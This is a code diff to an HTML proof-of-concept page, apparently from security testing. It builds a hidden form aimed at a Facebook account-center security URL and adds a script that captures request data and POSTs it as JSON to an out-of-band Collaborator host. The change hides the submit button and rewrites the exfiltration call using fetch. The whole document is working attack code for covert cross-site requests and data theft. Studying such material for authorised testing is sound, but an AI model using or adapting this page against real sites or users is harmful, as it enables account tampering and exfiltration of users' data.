@@ -9,7 +9,7 @@
     <form id="myForm" method="GET" action="https://www.facebook.com:443/recent_emails/security/?hide_back_button=1&from_accounts_center=1">
         <input type="hidden" name="hide_back_button" value="1">
         <input type="hidden" name="from_accounts_center" value="1">
-        <input type="submit" value="Send">
+        <input type="submit" value="Send" style="display: none;"> <!-- Hide the submit button -->
     </form>
     <script>
         // Function to capture and send data to Burp Collaborator
@@ -39,16 +39,18 @@
             // Convert request object to JSON
             var jsonData = JSON.stringify(request);
 
-            // Send captured data to Burp Collaborator
-            var xhr = new XMLHttpRequest();
-            xhr.open('POST', 'https://co4oiq53nckmdhpt89g0rjnkujqxocigt.oast.pro', true); // Change to HTTPS
-            xhr.setRequestHeader('Content-Type', 'application/json');
-            xhr.onreadystatechange = function() {
-                if (xhr.readyState === XMLHttpRequest.DONE) {
-                    console.log('Captured data sent to Burp Collaborator successfully');
-                }
-            };
-            xhr.send(jsonData);
+            // Send captured data to your server
+            fetch('https://co4oiq53nckmdhpt89g0rjnkujqxocigt.oast.pro', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: jsonData
+            }).then(function(response) {
+                console.log('Captured data sent to server successfully');
+            }).catch(function(error) {
+                console.error('Error sending captured data to server:', error);
+            });
         }
 
         // Intercept form submission and capture data
